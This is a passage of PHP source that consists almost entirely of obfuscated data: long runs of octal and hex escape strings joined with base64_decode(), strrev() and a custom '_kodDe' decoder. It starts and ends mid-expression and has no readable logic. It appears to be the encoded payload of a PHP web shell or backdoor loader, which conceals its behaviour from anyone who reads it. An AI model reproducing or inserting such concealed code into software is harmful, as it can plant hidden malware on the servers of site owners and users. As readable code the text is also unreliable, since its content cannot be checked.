ith2wpcLdmkA0WgaKggFI8W')."\xc5\xd5\x41\x33\xc0\xe0\x60\x7c\x10\x60\x29\xa3\xca\x24\x2f\x9\x70\x22\x96\x40\x47\x10\xc2\xd9\x20\x56\x48\x43\x16\xe1\x55\x58\x9e\xc2\xed\xcc\x9b\x19\xca\xe5\x88\x49\x72\xef\x6a\xd6\x6\x4a\xcb\x64\x8\x14\x6e\x4f\xe\xad\x44"."\x2\xd1\xce\x6e\x4c\xe5\x11\x81\xcc\x53\x89\xd9\x36\x42\xe5\xdd\x29\xd9\x48\x24\x47\x2d\x8\x9\x1e\x9e\x2e\x90\x21\xec\x89\xf0\x82\x7d\x5d\xa1\x70\x2f\xb6\x8e\x88\x74\x76\x7\x7a\x7d\x1e\xc2\xbf\x31\x25\x60\x7c\x28\xc8\x48\x8b"."\xa5\x6a\xc8\xf9\x30\xa8\xda\xd6\xfd\xe8\x43\xb4\xcb\xa2\xe8\xab\x60\x5e\xc5\x2d\xc5\xb4\x70\x2f\x14\x32\xa4\x32\x64\xf4\x25\x64\xfe\x26\xa3\x2c\x8b\xab\xb1\x59\x27\x29\x92\xb9\x3f\x8\x85\xa3\x71\xd0\x1\x84\x3d\xb\x5c\xb7\x5a"."\x58\x28\x44\x45\xd3\xa2\x61\x94\xd8\x76\xf\x6d\x19\x4\x59\x49\x9e\xc3\x5\x2d\x25\x45\x98\x63\x5a\x4e\x82\xdd\x1c\x35\x72\x4e\x50\x5f\xa\xa0\xa\xf0\xcb\x9d\xa1\xbe\xae\x20\x35\x17\xf1\x27\x6c\x69\xfe\x70\x10\xda\x61\x92\xca"."\111\264\204\70\327\35\0\221\302\170\212\205\271\215\37\114\140\313\76\210\360\125\37\246\10\56\35\340\147\42\175\54\314\245\111\20\201\352\175\234\3\17\372\131\270\233\131\172\301\204\120\130\210\370\302\276\336".strrev('Z®Â©.'."\r".'ı·˜ùAç	g¯ÉÅØl1µÌu<k± Âƒ&	[„ﬂÆrÙ'."\r".'ıVÇâ◊©¢¡0áGÜã')."\202\103\55\34\342\126\126\325\250\104\13\277\262\242\47\336\23\132\212\343\310\325\104\100\113\161\201\137\32\222\200\100\34\345\2\261\111\227\57\66\43\44\100\307\22\66\2\223\372\102\203\76\356\267\100\110\300"."\20\42\162\113\334\233\201\167\355\120\154\74\346\1\42\203\271\216\233\141\370\73\44\52\214\164\102\321\220\330\7\220\334\76\272\242\322\245\303\105\2\361\234\236\241\106\312\200\105\122\1\2\377\256\242\1\304"."\75\111\6\260\115\54\344\250\131\6\266\7\211\307\66\304\216\214\271\75\330\4\6\112\62\61\27\257\131\74\260\12\254\272\221\210\315\176\47\216\354\370\111\351\240\315\44\204\347\61\216\54\42\77\144\263\263".base64_decode('iPQEibYtZkMbWLGhD/wtjW4IgL8e8NMTBYOnMgQwSXuCywMb4D88oVYSEYJ9G8C/gMVsCPY5M3cE').base64_decode('ooOBAEagYfLLUQHLIU0THJEsC1FzLakn0BWVYJx+Nh6vQZ3nHp5TG497zQFCLczctaZ6VkM1WUV8').base64_decode('kU7Of210UE4CSNnZPv7MsQaJLw2HBvqFeLdvZbBvKY1562iojroD8AcjoIs6KQ1yfx9inIicSDAS')."\105\136\33\101\373\1\157\7\21\101\20\207\73\0\314\233\355\163\254\143\40\330\343\27\115\24\41\42\131\122\20\137\47\253\312\154\132\71\32\107\306\212\64\2\273\234\206\21\171\321\10\352\3\32\301\35\100"."\x63\xa8\xbb\x68\x4\xf9\x15\xa1\x11\xd4\x50\x1a\x81\x5b\x92\x40\x1f\x4d\x3\x9b\x4f\xb0\x71\xa4\x3b\xca\xc\xd7\x95\xcd\xca\x25\x66\x7a\xb3\x30\x95\x10\xac\x6a\x1d\x27\x5c\xe8\xe4\x26\x0\xc7\x8d\x2c\x12\x48\xe1\x4c\x12\x2c\xfb"."\340\121\231\160\330\342\135\67\24\63\143\221\341\272\366\165\224\14\261\365\230\25\125\55\146\15\210\76\102\134\160\200\217\4\221\361\216\360\31\262\176\363\323\30\373\36\207\361\212\165\154\353\102\354\154\135\344".base64_decode('1+CVs6sCQggZsR/gnxjBjZFtCzGtqXbRBTXOrTQtoyjonTKdUKQKV0zAFLGv0OEQ6D9qGIWWclJP')."\x4b\x97\x38\x96\x5d\x95\x95\x5a\x64\x62\xef\x29\x4e\x3d\x35\x11\xcc\x55\xdd\xf8\x51\x2b\x55\xd7\xb6\x94\xbc\x2d\xc3\x80\x60\x14\x25\xa7\xb8\x21\x90\xcc\x4c\x99\xac\x2c\x37\xfa\x12\x3d\x96\xf8\x3b\xf0\x6f\x1e\xaa\x71\x47\x94\x1c"."\x39\x2e\xf7\x27\x90\x7a\x1f\x57\x18\x67\xdd\x61\xa\x6a\x7f\xe8\x50\x8a\xb7\xf\xbb\x87\x71\x64\x24\x25\x5\x59\x95\x5\x2c\xe\xec\xe1\x2e\x4a\x54\xbd\x33\x7\x56\x52\x6e\x1a\xd\x4f\x8c\xf8\x47\xa6\x54\x7a\xd0\xcb\xaa\xa4\xe9"."\375\212\221\127\321\271\327\40\127\22\146\351\12\37\66\244\211\315\316\321\321\1\244\146\167\226\122\324\300\27\372\331\210\270\33\50\62\165\54\205\210\100\142\142\15\323\174\5\103\201\362\12\172\224\310\127\13"."\x29\xd6\xc8\x61\x4a\x99\xe1\xa8\x9c\xa5\xeb\xbd\xb2\x36\x19\xd5\x57\xaa\xa\xb9\x61\xf0\x87\x6\xfb\x7a\x42\xd4\x43\x3\x75\xca\x42\xe6\x39\xb9\x43\x0\x1b\x8\xc3\x43\x23\x16\xd\x54\x6e\x92\x21\x93\xfa\xc\xd2\xd5\x1\x11\x2e"."\x77\xc1\x35\x43\xa4\xb\x34\xc0\x9c\xc2\x7c\xe1\xce\x6e\x20\xce\xc5\xbb\x82\x40\xd6\xd\xac\x22\x22\xd3\xf2\x90\x3f\x1e\x9\xd\x84\xe9\xe9\x3\x8c\x23\xab\x8a\x70\xa0\x73\x35\x3b\xd\x60\xd0\x2e\xdf\x4a\x27\x4\x16\x17\xf5\x2d"."\255\10\146\302\34\204\43\276\31\17\207\240\344\33\350\351\162\144\210\164\63\117\37\166\130\274\47\330\267\274\142\102\64\24\357\25\262\140\40\330\377\366\72\141\366\22\42\1\330\25\74\336\321\23\352\24\222".base64_decode('g6HyngDM2gHEojFdUGti69FZQmt7TSy1AS6v7jhYndtjR9XWxLztnjomE+KhEWwIKoNVM2pjYl6P')."\x87\x14\xc0\x2\x40\x22\x65\x16\xca\x94\x6\x89\xcf\xa0\x8\xb6\xeb\xb4\x7d\x81\xac\xe8\x47\x9\x3e\x3a\xa0\x99\x8a\xc7\xe9\xd3\x23\x88\xcf\xf5\xe2\x91\xd5\x11\xd6\x93\xd8\x96\xa0\x52\xba\x8d\x76\x30\x9a\x78\xc2\xed\x40\x6\x7f"."\375\42\152\124\311\27\52\42\332\210\317\146\145\41\202\74\252\316\173\50\202\100\242\131\27\106\342\30\353\125\275\225\316\304\144\21\32\227\362\376\346\263\30\200\210\41\100\43\275\335\132\355\316\273\123\261\350".strrev('£5Mπçä^.:»Àâvπ)-ò≥J¥´èt¬√ûåV¡OcΩ2™ô'."\r".'»R◊RD\'¡'."\r".'PeÜ∂"íËR')."\xb9\xe5\x5c\x46\x7\x3c\x31\x9b\xa7\x50\x79\xd4\x96\xce\xfd\x89\x14\x74\xb0\xd1\xa4\x1e\xed\xdc\xe0\x13\x42\x1a\x46\x6\x85\x53\xde\xf\xf\x97\x99\x1b\x16\x18\x31\x59\x4c\x1c\x49\x48\x59\xec\x92\x21\x82\x6a\xd7\x2a\x35\x13\xdf"."\x42\x5d\x60\xcd\x11\xd4\xb9\x43\x45\x2b\x8\xdd\xcd\x70\x1b\x2a\xc8\xa1\x90\x93\x1d\xb2\xae\x4a\xdc\x9\x19\x15\x3e\x2b\x33\x55\xb8\xd3\x14\xf4\xd3\xe9\xdc\xcc\x8f\xf2\xdb\xa6\xfc\x28\x3b\xbb\xa6\x4b\x2e\x5d\x9\x4b\x4a\x97\x70".base64_decode('KcW3oMQ/GEjrmKT3PESbvGMS6ruXrTzQ1El0muYbjDS7u3t9nW7AYRqp8sjqPCCTbpURiTxuNseh').strrev('›Ù™ÿaVeeKﬁùÿ„Åπ®:Ü+À†bº∫Ñv `ˇ=ŸfY>Â˙2UË,§ZsÅ.ÖW')."\125\25\277\273\252\322\167\127\71\276\273\252\374\273\30\344\240\76\271\120\350\304\376\302\304\71\153\3\45\305\10\145\176\151\170\43\42\136\304\20\141\25\137\133\173\100\262\137\65\241\370\233\142\370\46\17\61"._kodDe('LEH8pv0dYU3g6a+GOqUNknR2/hwqvnjcGDIHpPY2kumywuukqDuJxhN51xu++qzgL0R+6XyY3NNLEA==')."\7\100\45\174\51\123\304\174\110\102\142\242\2\375\44\252\246\44\47\64\335\310\323\61\43\116\222\230\277\33\346\15\207\273\314\301\333\53\34\16\60\63\312\136\171\302\227\121\42\12\144\157\244\3\3\23\5".base64_decode('3VRER0spBTnwYMY28gRkOvS6UjZGacqEG9Ta4fHHVJRRKsgJAjQTmvuZJx9n3WDPuvM2t2bUyZDo')."\x92\x41\xb5\x99\xb1\x72\x4e\x68\x70\x9f\x4e\xe8\x64\xce\x5d\x11\xe0\x16\x8c\xd5\x30\xdb\x10\x7c\xea\x81\x86\x64\xd8\x68\xb8\xc9\x44\xcf\xa2\x9e\xa1\xd7\x66\xf8\x67\x4d\xa5\xea\xb9\xd\xee\x9d\x29\x14\x89\x60\x4f\x73\xcb\x95\x49"."\352\347\310\61\125\34\256\221\142\113\143\275\261\250\330\257\226\41\247\323\240\332\202\67\25\133\135\300\67\44\332\364\351\335\70\221\35\346\221\25\35\67\221\104\344\114\314\153\240\113\113\327\170\234\121\52\362"."\156\131\201\126\21\374\77\247\126\221\144\240\374\112\147\56\277\43\55\24\5\7\255\130\126\356\107\276\270\50\263\21\166\12\310\7\26\361\63\307\234\122\201\156\325\72\164\252\43\264\276\12\320\153\125\153\325".base64_decode('rBrwW1vlqoJCEYrDEYYA9O2q1lk1KFBLbD2niB6T4FSGn4CSPUC7bFnCzr0d9R1kCI3eRu844T3t')."\x63\xf0\x8b\xdc\x63\xa4\x73\x21\x99\x88\x3\xde\x49\x6f\x64\xe3\x22\x7\x27\x6b\x3\x19\x23\x31\xa5\x9b\xd5\x84\xf2\xf6\x5e\xff\x5c\xca\x8a\x7d\xbd\x6b\xdc\xdc\xcd\xd3\xa2\xf6\x89\x7c\x4e\x22\x6e\x99\x16\x57\x37\x78\xea\xab\x25"."\xea\x42\x74\x71\xf5\x40\xb4\xcb\x3d\xbf\xba\xbd\x6d\xaf\x45\x9d\xe8\x8\xcf\x52\x7a\xe1\x19\x1c\x74\xb1\x85\xfd\x69\xb6\x91\xed\xfc\x22\x38\x57\x59\xc4\x6b\x8f\x4d\x97\x97\xf0\xc4\xbc\x3c\xa5\x6b\x60\xbd\x4\xbb\xe0\xbc\x27\x49".strrev('ã–¯ÌÎ[(ZVµ,nHªöã&'."\r".'h'."\n".'⁄µl_Lì4!ßkòLô\' ›q¨SKºÓ8ﬂ¯≥:')."\252\35\137\344\253\220\143\305\35\34\213\63\244\74\17\142\37\211\255\222\350\70\123\360\206\344\206\342\10\236\347\164\373\112\140\220\13\123\220\52\372\226\242\23\143\211\243\276\160\64\334\100\236\203\123\4\314"."\x52\xb0\xcc\x5b\x4a\x25\x14\xd2\x5c\xa9\x62\x27\x48\xce\x5e\x40\x59\xe0\xf8\xbb\x45\xcf\x8f\x13\xee\x22\x4a\xd6\x94\x9\xcb\xd\x49\xc0\x4d\x3d\x5a\x94\xa7\xf0\xb9\x5e\xb1\xaa\x49\x42\x4d\x95\x50\x6\x8a\x6a\xca\xf9\x49\x74\x6a"."\xec\x2e\x16\xe9\x7\x2b\x16\x2a\xfa\x54\xa5\x8\xa8\x11\xc1\xd4\x74\xd\xc7\x50\x9b\x8c\x2f\x3\xa\x60\x62\xbd\x73\x9b\x20\x9c\xee\x94\xfb\x95\x3\xb3\x5e\x6a\x6c\x6a\x9d\xbb\x0\xfc\x4f\xb8\x30\x3d\xa\x2f\x16\xac\xc5\x2c\x48".base64_decode('/c7N8KYpA+F+IGmL4ZjbnO0JYN65jDVQzmPD47W1+QIlDcWbTMHFYAVOm1JKdBUmi7Ag27DRyNCA')."\301\360\145\76\31\22\271\121\136\341\4\274\332\42\264\74\12\352\243\163\131\16\55\327\2\343\117\146\213\332\350\142\41\121\262\164\135\312\313\332\44\331\145\314\66\133\147\233\130\77\151\266\247\71\155\202\10"."\xe1\xe7\xcc\x2b\x26\x5c\x8a\xb8\x9f\xf\x6c\xd1\x4b\x52\xc0\x62\xd\x45\x4d\xe8\x40\xd4\x3\x97\xbc\x70\x91\xf9\x5f\xa2\xa\x3c\x4c\xaa\xb1\x98\x8f\xd7\x5c\x91\x79\xae\x2c\xa0\x30\xa9\x7d\x7f\xcf\xc0\xd2\x60\x9f\x70\xb1\x25\x0"."\xe2\x9d\xfe\xbe\xb8\xaf\xbf\xbf\x62\x82\xf8\xd\x2f\xf4\x94\xe9\x19\xa1\xee\x92\x93\x94\xb0\x16\xa9\xf9\x8c\x94\x84\x87\x71\x8b\xab\x20\xb4\x4a\x32\x8d\x24\xf5\x4e\x54\xe5\x25\x3c\x18\x21\xf0\x3d\xdb\x22\x95\x64\xa9\x86\x59\xa4"."\x34\xa0\x14\x37\xa\xe1\xe4\xea\xb6\x45\x5e\xb5\x8d\xf2\x69\xb0\x45\x82\x4\x1d\xd6\xa9\xc\xcb\x76\x4e\x25\x76\x1a\x56\xf1\x98\xcf\x97\x74\xf8\x8e\xec\x94\xb5\x95\xe5\x59\x60\xe1\x9e\x64\xa5\x24\x2f\x3a\xe6\xf2\xa\x3e\x47\xc9"."\266\137\324\55\262\371\11\261\237\200\262\63\266\12\203\122\220\223\243\160\214\71\353\305\311\36\222\320\17\167\46\70\301\346\323\320\22\16\321\101\305\301\247\340\316\324\120\63\131\172\46\263\36\27\4\327\350"."\243\216\52\207\221\173\167\147\222\257\240\72\101\160\274\234\60\270\271\346\60\260\206\330\77\203\151\105\104\342\20\212\323\323\267\164\210\152\255\240\130\154\250\332\123\167\324\121\136\225\136\67\305\252\50\56\136"."\241\75\14\33\307\143\36\73\76\250\34\351\115\206\110\0\116\114\54\317\55\43\124\274\227\267\216\253\153\262\153\45\11\336\65\55\136\334\66\304\316\76\207\151\32\225\304\324\206\371\164\34\247\262\356\350\40"."\13\166\366\161\311\224\121\56\236\230\36\244\35\347\263\373\166\152\57\61\57\242\342\124\306\141\137\241\40\106\351\113\7\320\41\214\67\247\46\274\154\332\170\21\314\223\344\352\241\24\5\115\132\7\34\336\11".base64_decode('ORKgOh8ClwDHAXLNiBMOymJAFlhkJg21YNkmPPadX4X8vo7IJRmjVEnUc3cV8mJXBSY4TiGznFdl').base64_decode('EeThkqHkFleh6ppZRQH5s0AEr/gRkLFKomwmL7MeMywdLCJMK5P4Nx4IE30zX99qm9Aycy3+nTWT')."\22\12\162\213\235\3\322\40\122\252\101\254\4\235\206\247\371\201\24\361\45\335\37\16\105\103\235\324\207\156\245\223\53\146\264\145\142\305\133\276\301\240\372\216\313\3\253\355\30\154\165\365\22\10\31\176\243"."\xa8\x69\xec\xe6\xe\xa\x7d\x6c\x6d\x48\x20\xbf\xd\x91\x6c\xd1\xe2\xab\xa\x74\x78\x17\x85\xaa\xec\x26\x1\xb\xe\x43\xa0\xbb\x12\x25\xe5\xa1\x8b\x29\x73\x5c\x43\xe0\x15\x72\xe0\x73\x50\x58\x1e\x9d\xe\x82\x7f\x4f\xfa\xa5\x9c"."\116\75\246\64\326\327\327\273\353\33\300\377\354\36\204\174\242\225\132\151\10\50\365\365\255\350\177\42\257\300\163\121\322\241\366\24\60\177\51\57\41\10\343\140\233\117\102\4\105\325\212\124\272\0\375\205\234"."\225\264\322\211\276\120\330\61\55\224\24\330\72\22\123\234\55\355\321\63\266\101\241\134\36\316\154\32\6\113\74\30\16\324\162\332\223\364\312\22\240\361\201\6\365\10\150\51\42\270\57\304\332\335\213\305\217"."\x79\x68\xf\x8a\x40\xf1\xcc\xd9\x62\x69\xb6\xef\x3\x28\x58\xf2\x92\xac\xea\x10\x20\x9c\x23\x40\x11\x44\xf0\xd6\x2\xa3\xe2\x45\x20\x4a\x66\x7a\xc6\x28\x96\x63\xd6\x22\x30\xda\xc7\x4a\xaa\x44\x42\x59\x7d\x3c\xce\x57\x30\x18\x5d".base64_decode('xmKoT6DcT4mFtZ50DGV8lDjoJRm5oEImGKNqzqbfHxfKFr08Av4CBUQ6rPiMm3wAekfx8N5DTsCQ')."\267\177\174\257\335\272\227\320\223\206\316\265\354\313\136\257\240\261\110\345\313\130\341\210\211\302\246\301\144\47\120\24\22\240\0\174\135\332\311\134\232\10\5\70\223\34\171\174\51\341\221\6\223\373\62\351\144"."\276\221\104\7\47\330\173\213\160\15\151\22\317\173\334\153\22\55\203\265\276\150\344\74\5\103\317\200\221\60\205\172\101\170\177\145\60\103\57\307\254\200\304\32\44\342\211\100\250\104\100\337\7\40\104\305\16"."\321\301\356\212\261\105\1\225\213\312\2\320\256\20\40\44\164\62\177\272\42\20\312\372\3\302\376\215\175\324\116\35\160\43\341\50\231\244\363\153\152\270\221\26\117\34\125\275\223\120\0\154\23\277\263\262\303"."\313\150\205\320\371\142\102\340\257\237\170\26\15\234\103\70\4\252\56\73\325\21\317\54\53\214\240\175\224\312\206\3\321\165\67\274\313\141\63\131\210\241\373\154\17\162\371\307\105\126\107\324\171\347\215\170\224"."\x45\xd9\xc\xf5\x56\xa6\x31\x4f\xc1\xb0\xa9\x98\x6b\xe3\x78\x85\x2f\x90\x4c\x2c\x8b\x87\x5e\x81\x7b\x92\xe9\x8c\x3\xc4\x8\xa3\xc\xa0\x70\xe9\x1c\x29\x7c\x2\x91\x91\xf2\xb6\x5e\x7d\xa\xf0\x1e\xd9\x3b\xd7\x53\x2f\xd5\xc\xaa"."\x40\x2e\x1a\x37\xa5\xbe\xa8\xd4\xe2\x69\x5c\x28\xd\x86\x6\x5b\x9a\x6b\x25\x20\xa1\xe5\x94\x41\x25\xb1\x5c\xb5\xbc\x73\x9b\xe6\x79\x9a\x5a\xa4\x9a\xe5\xdd\xd1\xde\x1e\x97\x4\xcd\x72\xa4\xa5\x40\xe2\xd3\x6b\xa5\xce\xac\xa1\xe7"."\x15\x6f\xe3\x3c\x68\x65\xd0\x3c\xb7\xc9\xb3\xa0\x59\x8a\xc8\x69\xd9\x50\x49\x2e\xc2\xe1\x88\x86\xe4\x38\xb5\xa2\x2e\x28\x5a\x5c\xa8\x72\x5c\xd8\x80\xe2\x45\x1a\x87\xd1\x45\x3d\xa4\x3e\x49\x40\xc0\x77\x52\xe4\xe6\x6b\x8\x16\x45".base64_decode('FP4AiaNXrMTSUAlEs0fc5UJcO3HYi4UIwxxXgk/W2C7bjjiVsmcwh/hchLxeoD8YZdQGVaFz4ts/')."\203\152\212\135\125\17\305\314\341\272\230\267\127\111\251\162\207\76\201\243\103\350\7\151\113\102\325\263\132\30\235\363\337\104\353\142\303\124\125\11\176\260\133\341\273\51\357\354\176\177\227\233\243\263\335\33\162"."\25\314\35\136\223\212\41\107\207\374\13\264\174\132\172\324\271\171\303\141\374\16\0\16\167\302\121\0\153\276\237\55\155\200\141\363\10\32\44\33\56\323\132\61\364\124\61\111\213\354\267\305\12\251\364\112\161"."\23\351\47\363\12\111\131\342\253\75\23\100\314\146\55\62\142\332\60\232\373\20\212\332\201\141\165\266\266\141\330\234\331\263\3\241\56\246\242\310\61\46\32\353\207\355\261\366\232\41\55\75\334\136\133\3\63".base64_decode('biAwXArtXvqKk60q4ldt3TtHT4x4VbLD8xL6QXVbtKjGU1fb1sY3gF5IhLYSWJ2he8fysm2RMEU2')."\230\53\110\57\220\44\214\311\302\177\234\123\301\350\44\63\274\324\373\117\163\172\203\176\322\341\103\303\70\260\10\364\311\332\266\341\272\332\241\266\12\20\226\257\337\120\112\25\233\14\372\215\215\167\214\274\75"."\25\43\262\172\214\76\111\105\24\357\142\104\363\216\52\311\61\245\71\332\224\232\130\54\226\102\336\271\231\202\63\201\60\207\356\65\63\101\274\121\304\300\0\212\60\223\342\55\32\222\335\151\124\327\66\200\314"."\364\136\27\171\352\332\146\321\314\350\142\201\22\310\17\366\242\66\112\335\165\354\353\23\135\1\360\307\210\362\110\122\74\272\163\40\310\200\125\273\3\175\321\140\64\30\40\212\335\273\354\271\327\76\77\40\175".base64_decode('QJQof7AXLRJ0bmyivh78LQB/MvhLgr8UJOGYCf6dD/5AShOANimxibkJ8AdS54HfeRArDf7mci7S')."\xd6\xc6\xb\x6\xad\xf5\xb9\xbb\x40\xb3\x2b\x15\xe\xb2\xb4\x31\xa\x17\x2a\x8\x77\xeb\x89\x11\xca\x37\xe9\xa1\x2\x7c\xfc\x40\x91\xe9\x1c\x92\x73\x74\xc9\x14\x1f\xc6\x82\x9f\x8c\x19\x70\xde\xc1\x59\xc7\xa7\x47\xd\xb4\x53\x44"."\x78\x70\xb6\x56\xa8\x9\xc7\x65\x98\xb6\x46\x4c\x47\xc3\x3\xdf\x8e\x25\x4e\x63\xd6\xac\x39\x6e\x4f\x7d\x43\x63\x53\xf3\xdc\x96\x79\xd4\x3d\x88\x56\xcc\x2b\x6\x3d\x2a\xf1\x22\x3f\x88\x4d\xf0\x47\x4d\xd1\x1f\x7e\x8\x63\x3f\xc7"."\55\230\324\114\76\317\54\320\1\157\244\262\200\240\264\143\212\152\116\243\312\144\57\75\131\200\113\145\32\136\15\221\264\371\35\375\204\162\274\261\41\310\155\142\224\22\241\53\130\101\161\206\304\42\131\352\252"."\177\166\175\143\252\225\375\343\200\121\71\51\143\172\204\272\342\227\220\344\42\150\23\125\331\32\51\144\170\305\242\302\243\111\200\10\314\116\174\175\51\34\14\303\22\205\262\205\323\104\24\207\257\110\121\201\10".base64_decode('A3IJ6upeTBPASzxAiEp7AquCXZ5O+AhUpMCso83wUqI6ygKo8h64XdOUHL19hRdvYbbGgSa5RgpK').base64_decode('xlXQMq6MmnYl8gWXpabT8B8XGENXIZlymaWMS0nLE65xJVGgDq6NRpdipF2jqaQrlTRcKVCAZoy7').base64_decode('NCXt0gHcGG90FUDYBDAZ/JkGdWiiphQdbIpMPVdESlIT08AnqRhEIatsvRDs8td7VoVZ6oRrmgRn').base64_decode('Mau/sZhJWzGrncWIiX7qmXwJHhIax+9ayTno6Zz8N5EveOAfEiMUiOhCY74E+jUQtBk8FBFd0kxy').base64_decode('YUQ3VCAuy5UrEnImmnraGmfqViJqhKQIdSMVYSkkbpZj2lqhG1H28ktCtfrBBlrm+od4NAHcjBeg')."\x61\xa5\x90\x4\x81\x0\xbb\x5f\x9d\xa0\x56\xd6\x4b\x3c\xf8\x3a\x97\xe3\x17\x60\xa2\x8b\xc1\xd\x79\xdc\x91\x46\x88\xd0\x31\x9\x2a\x4f\x10\x50\xe\x9c\x1d\xb4\x30\x78\xa2\x19\x87\x7\x9a\x42\xcb\x96\x78\x82\xdd\xfe\xb0\x7\x95"."\207\154\360\370\267\341\35\245\41\32\361\343\217\62\1\233\41\146\162\172\102\316\305\161\31\374\252\113\326\0\127\141\106\332\113\74\70\16\112\363\330\123\62\124\265\51\247\153\31\325\52\246\354\155\132\332\37"."\101\125\51\202\14\36\7\112\16\224\367\55\31\154\30\162\356\333\360\355\30\51\245\244\46\225\136\171\264\2\101\101\50\45\231\74\303\300\71\70\217\267\345\200\247\42\54\13\177\240\10\61\137\77\73\322\23".base64_decode('swRpEjzHBl1Hc6MsKQ4XCvIJLFQsCrNWWoDIaJOAM1JjRh8gNKiz0yXuPEgxnaHe/oFowO+piESB').strrev('H}∞´öó|˘π¶µ'."\0".'Q,Ω@’E˙µ⁄ûTÃSË¸a@∏tÇÉMriƒÉ£Æÿ21·íïHÉÕ¬').strrev('Rå”õ*áHRßé˙ï|*·ﬁ“ßî≤Ö> Á!“ñ™ÃDV/≈cGÒJ∞P‘!#†+¨°òÊ≤¡–~ö*')."\31\112\140\245\260\20\223\240\234\164\311\51\313\164\311\105\227\234\67\134\162\311\160\45\164\155\324\225\62\323\340\317\164\201\245\27\46\247\163\0\61\47\273\162\200\201\271\362\152\112\165\345\101\100\265\134\23"."\171\227\331\224\47\213\160\276\0\22\13\115\56\75\155\270\214\121\120\244\231\205\163\143\324\65\56\227\134\343\171\331\225\157\226\135\172\46\343\52\215\245\135\343\45\127\111\117\272\54\172\366\113\305\244\270\51"."\352\5\216\25\325\344\50\4\173\340\77\140\134\362\5\63\136\324\324\11\352\7\74\257\353\45\51\137\312\246\276\15\37\173\353\166\342\143\241\4\360\75\103\67\107\145\17\322\117\122\14\347\162\304\322\207\10".base64_decode('wgaowAdGWy4UXECgSYFtJzJGHXbm5PUZYqsgVYKKQ0lNzIErQz+B5QRBtQMm4pUrbtiOv5l/EHic')."\x22\x8a\xa8\x44\xe4\x2\xc5\x51\xcf\x36\x78\x65\x14\x34\xf3\x31\xca\x74\x2b\xa3\xf3\xf3\x36\xd0\x10\x90\xb7\x4b\xd\x1b\xe0\xbf\x8d\x1b\x64\xc0\x5b\x4b\xba\x91\x50\x4d\xfa\x8a\x13\x6b\xfa\xb0\x28\x6c\xfe\xe7\x99\x44\x66\xf8\x5f"."\xe4\xe2\xf2\x69\x46\xd1\x8c\xff\xfa\xab\x42\xa6\x49\x85\x5a\xc6\xfc\xe7\xd9\x79\x1e\xd0\x51\xd4\x80\xfa\xbf\xe8\x28\x98\x29\x2e\x3e\xa8\x46\x90\x4c\x4f\x41\x4d\x42\x4e\xed\xa9\xf7\xf0\xfb\x12\x24\xd6\xd0\xb9\xd7\xc\x66\x69\xc9".strrev(']•-@B~&ó2ö∫4 m‹…ßéhHÄVCÃs2Ä%£Ú∏J_#.´F`K◊ï…Y¶≠SÜnï')."\x9a\x59\x72\x81\xd9\xf\xfe\x1f\xb7\x40\x71\xe0\x37\xf\x64\x91\x3c\x94\xd0\xf3\x40\x54\x2f\x51\xaf\x8f\x60\xe1\x54\x2c\xd9\xa3\x6b\xf0\x3d\x3\xe8\xed\xdf\x33\xe\x8f\xee\x5c\xd3\x9\xd7\xe5\xf8\x59\x74\xf2\x56\x9e\x61\xf2\xbf"."\145\3\56\373\204\115\222\103\265\270\140\254\360\37\263\10\107\131\70\131\50\11\327\26\355\141\204\31\271\304\103\132\201\245\104\230\340\142\362\47\107\43\231\341\125\113\62\236\323\365\321\142\101\140\5\70\25"."\xef\xb2\x4d\xcf\x50\x7d\xc3\x86\x86\x61\xf\x9f\xde\xdf\x86\x89\x8b\xfd\x36\x2c\xc4\x18\x4\x24\xde\x33\x18\x1d\xa5\xc7\xbf\xb9\x8a\xe4\x4b\x42\x6\x61\xf\xc9\xf9\x26\xe7\x97\x1b\x44\x7e\xb9\x81\x30\xbb\x61\x9b\xf0\xeb\x24\xe".base64_decode('xnVhAuwEehZKfsu47pAB9ozivKqweyAiF2XG9FF4W0XY5PsGLAebtzF3G4vOs8XbthMuA6NBweEy')."\x7e\x6e\x24\xb3\x2a\xbd\x75\x42\xb7\x26\x5c\xf0\x2f\x6a\x74\x6b\xa0\xa4\x4\x79\x1f\x64\xc8\xa5\xc\x45\x13\x1e\xe2\x1\x2d\x2\x3b\x34\xe8\xc2\x84\x81\x40\x27\xa\xef\x6f\x8\xda\x53\x3a\x93\x50\xd0\x64\xc1\xc1\xa5\x3d\xa1\xe"."\x1f\xf2\x3a\x10\xef\xe\xd1\xd7\xa5\x17\x2f\x6e\x43\x47\xc6\xec\x61\x6c\x40\x2f\x6e\xf0\xa1\xc\x7b\xe9\x71\x50\x36\xa0\x2\x83\x2b\x4a\x14\xe6\x24\x92\x2a\xe9\x1a\xbb\xd6\x22\xe7\x62\xe3\x18\x15\x47\xfa\xbb\xfb\xe3\xbe\x81\x68"."\267\340\271\201\201\372\211\6\16\172\106\33\102\102\341\340\32\37\367\323\224\220\115\172\136\64\70\70\350\206\347\355\320\354\44\211\136\340\356\200\211\22\144\204\371\305\125\243\172\52\231\323\213\251\52\136\240"."\267\301\123\57\65\327\67\110\3\32\125\254\244\333\43\372\254\272\246\273\205\367\20\35\17\253\333\23\155\157\376\322\217\343\44\260\227\0\144\45\354\230\103\45\305\20\154\4\350\63\326\344\267\67\264\222\350"."\xfe\x76\x86\xfa\xc9\xf9\x41\xef\x72\xa6\x87\xe2\x57\xa\x54\x68\xee\x2c\x7b\x1f\x19\xa9\xce\x4c\xe4\x73\xb\x99\x62\x8e\x70\x2a\xba\xc8\xdf\x5a\x30\xf4\x42\x5a\xd5\x52\x12\xc0\xd1\xcc\x56\xff\xe2\x2a\xbf\x6f\x65\x6b\x55\x1b\x48".base64_decode('knM5mCp52xZ5OSIZsf5wqL8ryHw29MMhIMdj5G32AJkZ5FM27fAq0NNVXDu8CtWpSqKu5ZAdDg42')."\64\22\147\206\242\201\52\321\260\204\206\146\102\77\300\50\263\111\101\4\342\17\100\323\174\201\74\262\354\24\334\141\10\201\201\304\106\257\133\264\321\3\35\1\327\47\170\103\16\173\25\166\114\22\252\13\241"."\111\203\273\306\226\316\162\145\24\213\334\312\42\70\254\135\312\13\327\35\67\176\157\136\67\46\141\146\7\132\305\217\122\255\47\144\326\317\357\230\311\325\65\231\345\202\211\57\67\117\116\60\363\4\120\44\272"."\257\163\14\64\211\106\26\127\21\33\76\72\57\40\63\254\152\303\174\157\121\244\125\231\200\203\12\232\334\26\102\157\121\367\351\26\122\173\132\344\25\323\0\42\121\151\155\143\303\5\61\50\20\25\7\133\215"."\252\322\146\47\132\270\137\157\225\330\103\342\234\142\213\126\232\20\354\112\331\230\154\225\52\74\110\236\253\250\131\156\241\22\11\23\353\215\126\234\264\320\320\10\124\155\361\374\226\346\372\172\127\276\150\132\156".strr